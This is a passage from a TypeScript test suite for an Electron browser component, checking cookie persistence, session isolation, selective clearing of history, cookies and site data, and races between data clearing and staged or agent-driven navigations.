          expirationDate: Date.now() / 1_000 + 3_600,
        })
        await session.defaultSession.cookies.set({
          url: 'https://example.org/',
          name: 'default-probe',
          value: 'persisted',
          expirationDate: Date.now() / 1_000 + 3_600,
        })
        await browserSession.cookies.flushStore()
        await session.defaultSession.cookies.flushStore()
        browserSession.flushStorageData()
        return {
          storagePath: browserSession.storagePath,
          cookies: await browserSession.cookies.get({ url: 'https://example.org/' }),
          defaultCookies: await session.defaultSession.cookies.get({ url: 'https://example.org/' }),
        }
      })
      assert.equal(existsSync(browserHome), true)
      assert.ok(first.storagePath?.startsWith(join(temporary, 'sessionData', 'Partitions')))
      assert.equal(
        first.cookies.find((cookie) => cookie.name === 'profile-probe')?.value,
        'persisted'
      )
      assert.equal(
        first.cookies.some((cookie) => cookie.name === 'default-probe'),
        false
      )
      assert.equal(
        first.defaultCookies.some((cookie) => cookie.name === 'profile-probe'),
        false
      )
      const exited = once(application.process(), 'exit')
      await application.evaluate(async ({ app }) => {
        setTimeout(() => app.quit(), 100)
      })
      await exited
      application = await launchRegistryProbe('', temporary)
      const second = await application.evaluate(async ({ session }) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        return {
          path: registry.target(registry.snapshot().activeTabId!).session.storagePath,
          browser: await registry
            .target(registry.snapshot().activeTabId!)
            .session.cookies.get({ url: 'https://example.org/' }),
          default: await session.defaultSession.cookies.get({ url: 'https://example.org/' }),
        }
      })
      assert.equal(second.path, first.storagePath)
      assert.equal(
        second.browser.find((cookie) => cookie.name === 'profile-probe')?.value,
        'persisted',
        JSON.stringify(second.browser)
      )
      assert.equal(
        second.default.find((cookie) => cookie.name === 'default-probe')?.value,
        'persisted'
      )
      await application.close()
      application = await launchRegistryProbe('', temporary, false, join(temporary, 'other-home'))
      const other = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const browserSession = registry.target(registry.snapshot().activeTabId!).session
        return {
          path: browserSession.storagePath,
          cookies: await browserSession.cookies.get({ url: 'https://example.org/' }),
        }
      })
      assert.notEqual(other.path, first.storagePath)
      assert.equal(
        other.cookies.some((cookie) => cookie.name === 'profile-probe'),
        false
      )
    } finally {
      await application?.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'selected browser data types clear cookies independently of history and cache',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-selected-clear-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const history = createBrowserHistory(join(temporary, 'home', 'browser'))
      history.record('https://example.org/visited', 'Retained visit')
      history.close()
      const result = await application.evaluate(async (electron) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const browserSession = registry.target(registry.snapshot().activeTabId!).session
        await browserSession.cookies.set({
          url: 'https://example.org/',
          name: 'selected-probe',
          value: 'one',
        })
        const before = registry.queryHistory({ offset: 0, limit: 10 }).total
        const cacheDeleted = await registry.clearData({ kind: 'clear-selected', types: ['cache'] })
        const afterCache = await browserSession.cookies.get({ url: 'https://example.org/' })
        const cookieDeleted = await registry.clearData({
          kind: 'clear-selected',
          types: ['cookies'],
        })
        const afterCookies = await browserSession.cookies.get({ url: 'https://example.org/' })
        const after = registry.queryHistory({ offset: 0, limit: 10 }).total
        await browserSession.cookies.set({
          url: 'https://example.org/',
          name: 'selected-probe',
          value: 'two',
        })
        const combinedDeleted = await registry.clearData({
          kind: 'clear-selected',
          types: ['history', 'cookies'],
        })
        const afterCombined = await browserSession.cookies.get({ url: 'https://example.org/' })
        const historyAfterCombined = registry.queryHistory({ offset: 0, limit: 10 }).total
        const mainCookies = await electron.session.defaultSession.cookies.get({
          url: 'https://example.org/',
        })
        return {
          before,
          cacheDeleted,
          cookieDeleted,
          afterCache,
          afterCookies,
          after,
          combinedDeleted,
          afterCombined,
          historyAfterCombined,
          mainCookies,
        }
      })
      assert.equal(result.before, 1)
      assert.equal(result.cacheDeleted, 0)
      assert.equal(
        result.afterCache.some((cookie) => cookie.name === 'selected-probe'),
        true
      )
      assert.equal(result.cookieDeleted, 0)
      assert.equal(
        result.afterCookies.some((cookie) => cookie.name === 'selected-probe'),
        false
      )
      assert.equal(result.after, 1)
      assert.equal(result.combinedDeleted, 1)
      assert.equal(
        result.afterCombined.some((cookie) => cookie.name === 'selected-probe'),
        false
      )
      assert.equal(result.historyAfterCombined, 0)
      assert.equal(result.mainCookies.length, 0)
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'selected data clearing preserves isolated sessions and invalidates only cleared profile targets',
  { timeout: 30_000 },
  async () => {
    const fixture = createServer((_incoming, response) => response.end('<title>Local page</title>'))
    fixture.listen(0, '127.0.0.1')
    await once(fixture, 'listening')
    const address = fixture.address()
    assert.ok(address && typeof address !== 'string')
    const origin = `http://127.0.0.1:${address.port}`
    const temporary = await mkdtemp(join(tmpdir(), 'browser-selected-isolation-'))
    const application = await launchRegistryProbe(origin, temporary)
    try {
      const result = await application.evaluate(async (_electron, url) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open', input: `${url}/local` })
        const localId = registry.snapshot().activeTabId!
        const localContents = registry.target(localId)
        const localSession = localContents.session
        await localSession.cookies.set({ url, name: 'local-probe', value: 'retained' })
        await registry.dispatch({ kind: 'open' })
        const agentId = registry.snapshot().activeTabId!
        const agentContents = registry.target(agentId)
        const prototype = Object.getPrototypeOf(agentContents) as {
          loadURL: (url: string) => Promise<void>
        }
        const originalLoad = prototype.loadURL
        prototype.loadURL = async function (this: Electron.WebContents, target: string) {
          Object.defineProperty(this, 'getURL', { value: () => target, configurable: true })
          this.emit('did-navigate', {} as Electron.Event, target, 200)
          this.emit('dom-ready')
        }
        try {
          await registry.agentNavigate(agentId, 'https://example.org/page', 'https://example.org')
        } finally {
          prototype.loadURL = originalLoad
        }
        const isolatedContents = registry.target(agentId)
        const isolatedSession = isolatedContents.session
        await isolatedSession.cookies.set({
          url: 'https://example.org/',
          name: 'agent-probe',
          value: 'retained',
        })
        const generationBefore = registry.agentTarget(agentId).generation
        await registry.dispatch({ kind: 'open' })
        const persistentId = registry.snapshot().activeTabId!
        const persistentContents = registry.target(persistentId)
        const persistentSession = persistentContents.session
        await persistentSession.cookies.set({
          url: 'https://example.net/',
          name: 'persistent-probe',
          value: 'clear',
        })
        const invalidated: string[] = []
        const unsubscribe = registry.onAgentTargetInvalidated((tabId) => invalidated.push(tabId))
        await registry.clearData({ kind: 'clear-selected', types: ['cookies'] })
        unsubscribe()
        return {
          remaining: registry.snapshot().tabs.map((tab) => tab.tabId),
          localId,
          agentId,
          localSessionSame: registry.target(localId).session === localSession,
          agentSessionSame: registry.target(agentId).session === isolatedSession,
          localCookies: await localSession.cookies.get({ url }),
          agentCookies: await isolatedSession.cookies.get({ url: 'https://example.org/' }),
          persistentCookies: await persistentSession.cookies.get({ url: 'https://example.net/' }),
          persistentDestroyed: persistentContents.isDestroyed(),
          generationAfter: registry.agentTarget(agentId).generation,
          generationBefore,
          invalidated,
          persistentId,
        }
      }, origin)
      assert.deepEqual(result.remaining, [result.localId, result.agentId])
      assert.equal(result.localSessionSame, true)
      assert.equal(result.agentSessionSame, true)
      assert.equal(
        result.localCookies.some((cookie) => cookie.name === 'local-probe'),
        true
      )
      assert.equal(
        result.agentCookies.some((cookie) => cookie.name === 'agent-probe'),
        true
      )
      assert.equal(
        result.persistentCookies.some((cookie) => cookie.name === 'persistent-probe'),
        false
      )
      assert.equal(result.persistentDestroyed, true)
      assert.equal(result.generationAfter, result.generationBefore)
      assert.ok(result.invalidated.length >= 1)
      assert.ok(result.invalidated.every((tabId) => tabId === result.persistentId))
    } finally {
      await application.close()
      fixture.closeAllConnections()
      await new Promise<void>((resolve) => fixture.close(() => resolve()))
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'history-only clearing does not cancel an in-flight Agent navigation',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-history-agent-navigation-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        const contents = registry.target(tabId)
        const prototype = Object.getPrototypeOf(contents) as {
          loadURL: (url: string) => Promise<void>
        }
        const originalLoad = prototype.loadURL
        let issued!: () => void
        let release!: () => void
        const started = new Promise<void>((resolve) => {
          issued = resolve
        })
        const held = new Promise<void>((resolve) => {
          release = resolve
        })
        prototype.loadURL = async function (this: Electron.WebContents, url: string) {
          issued()
          await held
          Object.defineProperty(this, 'getURL', { value: () => url, configurable: true })
          this.emit('did-navigate', {} as Electron.Event, url, 200)
          this.emit('dom-ready')
        }
        try {
          const navigation = registry
            .agentNavigate(tabId, 'https://example.org/page', 'https://example.org')
            .then(
              () => 'completed',
              (error) => String(error)
            )
          await started
          await registry.clearData({ kind: 'clear-history' })
          const stillPending = await Promise.race([
            navigation.then(() => false),
            new Promise<true>((resolve) => setTimeout(() => resolve(true), 50)),
          ])
          release()
          return { stillPending, outcome: await navigation }
        } finally {
          prototype.loadURL = originalLoad
          release?.()
        }
      })
      assert.deepEqual(result, { stillPending: true, outcome: 'completed' })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'selected profile clearing does not interrupt navigation in an unaffected Agent session',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-selected-agent-navigation-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        const contents = registry.target(tabId)
        const prototype = Object.getPrototypeOf(contents) as {
          loadURL: (url: string) => Promise<void>
        }
        const originalLoad = prototype.loadURL
        prototype.loadURL = async function (this: Electron.WebContents, url: string) {
          Object.defineProperty(this, 'getURL', { value: () => url, configurable: true })
          this.emit('did-navigate', {} as Electron.Event, url, 200)
          this.emit('dom-ready')
        }
        try {
          await registry.agentNavigate(tabId, 'https://example.org/page', 'https://example.org')
        } finally {
          prototype.loadURL = originalLoad
        }
        const agentContents = registry.target(tabId)
        const agentSession = agentContents.session
        let issued!: () => void
        let release!: () => void
        const started = new Promise<void>((resolve) => {
          issued = resolve
        })
        const held = new Promise<void>((resolve) => {
          release = resolve
        })
        prototype.loadURL = async function (this: Electron.WebContents, url: string) {
          issued()
          await held
          Object.defineProperty(this, 'getURL', { value: () => url, configurable: true })
          this.emit('did-navigate', {} as Electron.Event, url, 200)
          this.emit('dom-ready')
        }
        try {
          const navigation = registry
            .agentNavigate(tabId, 'https://example.org/next', 'https://example.org')
            .then(
              () => 'completed',
              (error) => String(error)
            )
          await started
          await registry.clearData({ kind: 'clear-selected', types: ['cookies'] })
          const stillPending = await Promise.race([
            navigation.then(() => false),
            new Promise<true>((resolve) => setTimeout(() => resolve(true), 50)),
          ])
          release()
          return {
            stillPending,
            outcome: await navigation,
            sessionSame: registry.target(tabId).session === agentSession,
          }
        } finally {
          prototype.loadURL = originalLoad
          release?.()
        }
      })
      assert.deepEqual(result, { stillPending: true, outcome: 'completed', sessionSame: true })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'local serve pages never enter browser history and clearing data closes browser views',
  { timeout: 30_000 },
  async () => {
    const fixture = createServer((_incoming, response) => response.end('<title>Local page</title>'))
    fixture.listen(0, '127.0.0.1')
    await once(fixture, 'listening')
    const address = fixture.address()
    assert.ok(address && typeof address !== 'string')
    const origin = `http://127.0.0.1:${address.port}`
    const temporary = await mkdtemp(join(tmpdir(), 'browser-history-local-'))
    const application = await launchRegistryProbe(origin, temporary)
    try {
      const result = await application.evaluate(async (_electron, url) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open', input: `${url}/local` })
        const before = registry.queryHistory({ offset: 0, limit: 10 })
        const deleted = await registry.clearData({ kind: 'clear-all' })
        return {
          before,
          deleted,
          tabs: registry.snapshot().tabs.length,
          after: registry.queryHistory({ offset: 0, limit: 10 }),
        }
      }, origin)
      assert.equal(result.before.total, 0)
      assert.equal(result.deleted, 0)
      assert.equal(result.tabs, 0)
      assert.equal(result.after.total, 0)
    } finally {
      await application.close()
      fixture.closeAllConnections()
      await new Promise<void>((resolve) => fixture.close(() => resolve()))
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'navigating a newly opened tab does not let its interrupted blank load close the tab',
  { timeout: 30_000 },
  async () => {
    const fixture = createServer((_incoming, response) => response.end('<title>New page</title>'))
    fixture.listen(0, '127.0.0.1')
    await once(fixture, 'listening')
    const address = fixture.address()
    assert.ok(address && typeof address !== 'string')
    const origin = `http://127.0.0.1:${address.port}`
    const temporary = await mkdtemp(join(tmpdir(), 'browser-open-navigation-race-'))
    const application = await launchRegistryProbe(origin, temporary)
    try {
      const result = await application.evaluate(async (_electron, url) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry, browserWindow } = globalThis as unknown as BrowserFixture
        const prototype = Object.getPrototypeOf(browserWindow.webContents) as {
          loadURL: (url: string) => Promise<void>
        }
        const originalLoad = prototype.loadURL
        let started!: () => void
        let rejectBlank!: (error: Error) => void
        const blankStarted = new Promise<void>((resolve) => {
          started = resolve
        })
        const blankLoad = new Promise<void>((_resolve, reject) => {
          rejectBlank = reject
        })
        prototype.loadURL = function (input) {
          if (input === 'about:blank') {
            started()
            return blankLoad
          }
          return originalLoad.call(this, input)
        }
        try {
          const opening = registry.dispatch({ kind: 'open' }).then(
            () => 'opened',
            (error) => String(error)
          )
          await blankStarted
          const tabId = registry.snapshot().activeTabId!
          const navigation = registry
            .dispatch({ kind: 'navigate', tabId, input: `${url}/page` })
            .then(
              () => 'navigated',
              (error) => String(error)
            )
          rejectBlank(new Error('ERR_ABORTED'))
          return {
            opening: await opening,
            navigation: await navigation,
            snapshot: registry.snapshot(),
            tabId,
          }
        } finally {
          prototype.loadURL = originalLoad
        }
      }, origin)
      assert.equal(result.opening, 'opened')
      assert.equal(result.navigation, 'navigated')
      assert.equal(result.snapshot.activeTabId, result.tabId)
      assert.equal(result.snapshot.tabs.length, 1)
      assert.equal(result.snapshot.tabs[0].url, `${origin}/page`)
    } finally {
      await application.close()
      fixture.closeAllConnections()
      await new Promise<void>((resolve) => fixture.close(() => resolve()))
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'a failed initial blank load still removes its unopened tab',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-blank-load-failure-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry, browserWindow } = globalThis as unknown as BrowserFixture
        const prototype = Object.getPrototypeOf(browserWindow.webContents) as {
          loadURL: (url: string) => Promise<void>
        }
        const originalLoad = prototype.loadURL
        prototype.loadURL = function (input) {
          return input === 'about:blank'
            ? Promise.reject(new Error('blank load failed'))
            : originalLoad.call(this, input)
        }
        try {
          const opening = await registry.dispatch({ kind: 'open' }).then(
            () => 'opened',
            (error) => String(error)
          )
          return { opening, snapshot: registry.snapshot() }
        } finally {
          prototype.loadURL = originalLoad
        }
      })
      assert.match(result.opening, /blank load failed/)
      assert.equal(result.snapshot.tabs.length, 0)
      assert.equal(result.snapshot.activeTabId, null)
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'a concurrent clear cannot let an in-flight tab open after the data sweep',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-clear-open-race-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        const opening = registry.dispatch({ kind: 'open' }).then(
          () => 'opened',
          (error) => String(error)
        )
        const clearing = registry.clearData({ kind: 'clear-all' })
        return {
          opening: await opening,
          deleted: await clearing,
          tabs: registry.snapshot().tabs.length,
        }
      })
      assert.match(result.opening, /cdp_busy/)
      assert.equal(result.deleted, 0)
      assert.equal(result.tabs, 0)
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'selected profile clearing rejects an in-flight persistent tab open',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-selected-open-race-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        const opening = registry.dispatch({ kind: 'open' }).then(
          () => 'opened',
          (error) => String(error)
        )
        const clearing = registry.clearData({ kind: 'clear-selected', types: ['cookies'] })
        return {
          opening: await opening,
          deleted: await clearing,
          tabs: registry.snapshot().tabs.length,
        }
      })
      assert.match(result.opening, /cdp_busy/)
      assert.equal(result.deleted, 0)
      assert.equal(result.tabs, 0)
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'site-data clear closes every tab sharing the persistent browser Session, not just a matching top-level URL',
  { timeout: 30_000 },
  async () => {
    const fixture = createServer((_incoming, response) => response.end('<title>Local page</title>'))
    fixture.listen(0, '127.0.0.1')
    await once(fixture, 'listening')
    const address = fixture.address()
    assert.ok(address && typeof address !== 'string')
    const origin = `http://127.0.0.1:${address.port}`
    const temporary = await mkdtemp(join(tmpdir(), 'browser-site-clear-'))
    const application = await launchRegistryProbe(origin, temporary)
    try {
      await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
      })
      const history = createBrowserHistory(join(temporary, 'home', 'browser'))
      history.record('https://example.org/visited', 'Cleared visit')
      history.record('https://iana.org/retained', 'Retained visit')
      history.close()
      const result = await application.evaluate(async (_electron, url) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open', input: `${url}/local` })
        const localId = registry.snapshot().activeTabId!
        await registry.dispatch({ kind: 'open' })
        const firstRemoteId = registry.snapshot().activeTabId!
        await registry.dispatch({ kind: 'open' })
        const secondRemoteId = registry.snapshot().activeTabId!
        const firstRemote = registry.target(firstRemoteId)
        const secondRemote = registry.target(secondRemoteId)
        const browserSession = firstRemote.session
        await browserSession.cookies.set({
          url: 'https://iana.org/',
          name: 'retained-site',
          value: 'yes',
        })
        await firstRemote.executeJavaScript("history.pushState({ visited: true }, '', '#visited')")
        const firstHadBackstack = firstRemote.navigationHistory.canGoBack()
        let missingOriginRejected = false
        try {
          await registry.clearData({ kind: 'clear-site-data' } as never)
        } catch {
          missingOriginRejected = true
        }
        const stateAfterInvalidClear = {
          tabs: registry.snapshot().tabs.length,
          history: registry.queryHistory({ offset: 0, limit: 10 }).total,
          cookie: (await browserSession.cookies.get({ url: 'https://iana.org/' })).some(
            (cookie) => cookie.name === 'retained-site'
          ),
        }
        const deleted = await registry.clearData({
          kind: 'clear-site-data',
          origin: 'https://example.org',
        })
        return {
          tabs: registry.snapshot().tabs.map((tab) => tab.tabId),
          localId,
          missingOriginRejected,
          stateAfterInvalidClear,
          deleted,
          remainingHistory: registry
            .queryHistory({ offset: 0, limit: 10 })
            .items.map((item) => item.title),
          firstHadBackstack,
          firstDestroyed: firstRemote.isDestroyed(),
          secondDestroyed: secondRemote.isDestroyed(),
          retainedCookies: await browserSession.cookies.get({ url: 'https://iana.org/' }),
        }
      }, origin)
      assert.deepEqual(result.tabs, [result.localId])
      assert.equal(result.missingOriginRejected, true)
      assert.deepEqual(result.stateAfterInvalidClear, { tabs: 3, history: 2, cookie: true })
      assert.equal(result.firstHadBackstack, true)
      assert.equal(result.deleted, 1)
      assert.deepEqual(result.remainingHistory, ['Retained visit'])
      assert.equal(result.firstDestroyed, true)
      assert.equal(result.secondDestroyed, true)
      assert.equal(
        result.retainedCookies.some((cookie) => cookie.name === 'retained-site'),
        true
      )
    } finally {
      await application.close()
      fixture.closeAllConnections()
      await new Promise<void>((resolve) => fixture.close(() => resolve()))
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'a staged cross-domain load cannot commit after site-data clearing has passed its tab snapshot',
  { timeout: 30_000 },
  async () => {
    const fixture = createServer((_incoming, response) => response.end('<title>Local page</title>'))
    fixture.listen(0, '127.0.0.1')
    await once(fixture, 'listening')
    const address = fixture.address()
    assert.ok(address && typeof address !== 'string')
    const origin = `http://127.0.0.1:${address.port}`
    const temporary = await mkdtemp(join(tmpdir(), 'browser-staged-clear-race-'))
    const application = await launchRegistryProbe(origin, temporary)
    try {
      const result = await application.evaluate(async (electron, url) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        await registry.dispatch({ kind: 'close', tabId: registry.snapshot().activeTabId! })
        await registry.dispatch({ kind: 'open', input: `${url}/local` })
        const tabId = registry.snapshot().activeTabId!
        const original = registry.target(tabId)
        let releaseLoad!: () => void
        let loadStarted!: () => void
        const deferredLoad = new Promise<void>((resolve) => {
          releaseLoad = resolve
        })
        const started = new Promise<void>((resolve) => {
          loadStarted = resolve
        })
        const intercept = (_event: Electron.Event, contents: WebContents) => {
          electron.app.removeListener('web-contents-created', intercept)
          Object.defineProperty(contents, 'loadURL', {
            value: async () => {
              loadStarted()
              await deferredLoad
            },
          })
        }
        electron.app.on('web-contents-created', intercept)
        const navigating = registry
          .dispatch({ kind: 'navigate', tabId, input: 'https://example.org/' })
          .then(
            () => 'committed',
            (error) => String(error)
          )
        const stage = await Promise.race([
          started.then(() => 'started'),
          new Promise<string>((resolve) => setTimeout(() => resolve('not-started'), 5_000)),
        ])
        if (stage !== 'started') {
          electron.app.removeListener('web-contents-created', intercept)
          releaseLoad()
          return {
            outcome: stage,
            samePage: registry.target(tabId) === original,
            url: registry.snapshot().tabs[0]?.url,
          }
        }
        await registry.clearData({ kind: 'clear-site-data', origin: 'https://example.org' })
        releaseLoad()
        const outcome = await navigating
        return {
          outcome,
          samePage: registry.target(tabId) === original,
          url: registry.snapshot().tabs[0]?.url,
        }
      }, origin)
      assert.match(result.outcome, /cdp_busy/)
      assert.equal(result.samePage, true)
      assert.equal(result.url, `${origin}/local`)
    } finally {
      await application.close()
      fixture.closeAllConnections()
      await new Promise<void>((resolve) => fixture.close(() => resolve()))
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'history-only clearing excludes a delayed staged navigation without cancelling the page',
  { timeout: 30_000 },
  async () => {
    const fixture = createServer((_incoming, response) => response.end('<title>Local page</title>'))
    fixture.listen(0, '127.0.0.1')
    await once(fixture, 'listening')
    const address = fixture.address()
    assert.ok(address && typeof address !== 'string')
    const origin = `http://127.0.0.1:${address.port}`
    const temporary = await mkdtemp(join(tmpdir(), 'browser-staged-history-clear-'))
    const application = await launchRegistryProbe(origin, temporary)
    try {
      const result = await application.evaluate(async (electron, url) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open', input: `${url}/local` })
        const tabId = registry.snapshot().activeTabId!
        let releaseLoad!: () => void
        let loadStarted!: () => void
        const deferredLoad = new Promise<void>((resolve) => {
          releaseLoad = resolve
        })
        const started = new Promise<void>((resolve) => {
          loadStarted = resolve
        })
        const intercept = (_event: Electron.Event, contents: WebContents) => {
          electron.app.removeListener('web-contents-created', intercept)
          Object.defineProperty(contents, 'loadURL', {
            value: async (destination: string) => {
              loadStarted()
              await deferredLoad
              Object.defineProperty(contents, 'getURL', {
                value: () => destination,
                configurable: true,
              })
              contents.emit('did-navigate', {} as Electron.Event, destination, 200)
              contents.emit('dom-ready')
            },
          })
        }
        electron.app.on('web-contents-created', intercept)
        const navigating = registry
          .dispatch({ kind: 'navigate', tabId, input: 'https://example.org/late' })
          .then(
            () => 'committed',
            (error) => String(error)
          )
        await started
        await registry.clearData({ kind: 'clear-history' })
        releaseLoad()
        const outcome = await navigating
        return {
          outcome,
          url: registry.snapshot().tabs[0]?.url,
          history: registry.queryHistory({ offset: 0, limit: 10 }).items.map((visit) => visit.url),
        }
      }, origin)
      assert.equal(result.outcome, 'committed')
      assert.equal(result.url, 'https://example.org/late')
      assert.deepEqual(result.history, [])
    } finally {
      await application.close()
      fixture.closeAllConnections()
      await new Promise<void>((resolve) => fixture.close(() => resolve()))
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'navigation commits without waiting for a stalled subresource and remains replaceable',
  { timeout: 30_000 },
  async () => {
    const fixture = createServer((request, response) => {
      if (request.url === '/asset') return
      response.setHeader('Content-Type', 'text/html')
      response.end(
        request.url === '/slow' ? '<title>Slow</title><img src="/asset">' : '<title>Next</title>'
      )
    })
    fixture.listen(0, '127.0.0.1')
    await once(fixture, 'listening')
    const address = fixture.address()
    assert.ok(address && typeof address !== 'string')
    const origin = `http://127.0.0.1:${address.port}`
    const temporary = await mkdtemp(join(tmpdir(), 'browser-navigation-pending-'))
    const application = await launchRegistryProbe(origin, temporary)
    try {
      const result = await application.evaluate(async (_electron, url) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        const staged = registry.dispatch({ kind: 'navigate', tabId, input: `${url}/slow` })
        const stagedOutcome = await Promise.race([
          staged.then(
            () => 'committed',
            () => 'failed'
          ),
          new Promise<string>((resolve) => setTimeout(() => resolve('pending'), 2_000)),
        ])
        const stagedUrl = registry.snapshot().tabs[0]?.url
        const next = registry.dispatch({ kind: 'navigate', tabId, input: `${url}/next` })
        const nextOutcome = await Promise.race([
          next.then(
            () => 'committed',
            () => 'failed'
          ),
          new Promise<string>((resolve) => setTimeout(() => resolve('pending'), 2_000)),
        ])
        return { stagedOutcome, stagedUrl, nextOutcome, finalUrl: registry.snapshot().tabs[0]?.url }
      }, origin)
      assert.deepEqual(result, {
        stagedOutcome: 'committed',
        stagedUrl: `${origin}/slow`,
        nextOutcome: 'committed',
        finalUrl: `${origin}/next`,
      })
    } finally {
      await application.close()
      fixture.closeAllConnections()
      await new Promise<void>((resolve) => fixture.close(() => resolve()))
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'superseding a staged navigation releases a page whose main document never commits',
  { timeout: 30_000 },
  async () => {
    const fixture = createServer((_request, response) => {
      response.setHeader('Content-Type', 'text/html')
      response.end('<title>Next</title>')
    })
    fixture.listen(0, '127.0.0.1')
    await once(fixture, 'listening')
    const address = fixture.address()
    assert.ok(address && typeof address !== 'string')
    const origin = `http://127.0.0.1:${address.port}`
    const temporary = await mkdtemp(join(tmpdir(), 'browser-staged-supersede-'))
    const application = await launchRegistryProbe(origin, temporary)
    try {
      const result = await application.evaluate(async (electron, url) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        let stageStarted!: () => void
        const started = new Promise<void>((resolve) => {
          stageStarted = resolve
        })
        const firstStage: { contents: WebContents | null } = { contents: null }
        const intercept = (_event: Electron.Event, contents: WebContents) => {
          electron.app.removeListener('web-contents-created', intercept)
          firstStage.contents = contents
          Object.defineProperty(contents, 'loadURL', {
            value: () => {
              stageStarted()
              return new Promise<void>(() => undefined)
            },
          })
        }
        electron.app.on('web-contents-created', intercept)
        const first = registry.dispatch({ kind: 'navigate', tabId, input: `${url}/stall` }).then(
          () => 'committed',
          () => 'cancelled'
        )
        await started
        await registry.dispatch({ kind: 'navigate', tabId, input: `${url}/next` })
        const firstOutcome = await Promise.race([
          first,
          new Promise<string>((resolve) => setTimeout(() => resolve('pending'), 2_000)),
        ])
        return {
          firstOutcome,
          destroyed: firstStage.contents?.isDestroyed(),
          url: registry.snapshot().tabs[0]?.url,
        }
      }, origin)
      assert.deepEqual(result, {
        firstOutcome: 'cancelled',
        destroyed: true,
        url: `${origin}/next`,
      })
    } finally {
      await application.close()
      fixture.closeAllConnections()
      await new Promise<void>((resolve) => fixture.close(() => resolve()))
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'destroying a staged WebContents aborts its pending load without replacing the registered tab',
  { timeout: 30_000 },
  async () => {
    const fixture = createServer((_request, response) => response.end('<title>Next</title>'))
    fixture.listen(0, '127.0.0.1')
    await once(fixture, 'listening')
    const address = fixture.address()
    assert.ok(address && typeof address !== 'string')
    const origin = `http://127.0.0.1:${address.port}`
    const temporary = await mkdtemp(join(tmpdir(), 'browser-stage-destroy-'))
    const application = await launchRegistryProbe(origin, temporary)
    try {
      const result = await application.evaluate(async (electron, url) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        const original = registry.target(tabId)
        let stagedContents: WebContents | null = null
        let stageStarted!: () => void
        const started = new Promise<void>((resolve) => {
          stageStarted = resolve
        })
        const intercept = (_event: Electron.Event, contents: WebContents) => {
          electron.app.removeListener('web-contents-created', intercept)
          stagedContents = contents
          Object.defineProperty(contents, 'loadURL', {
            value: () => {
              stageStarted()
              return new Promise<void>(() => undefined)
            },
          })
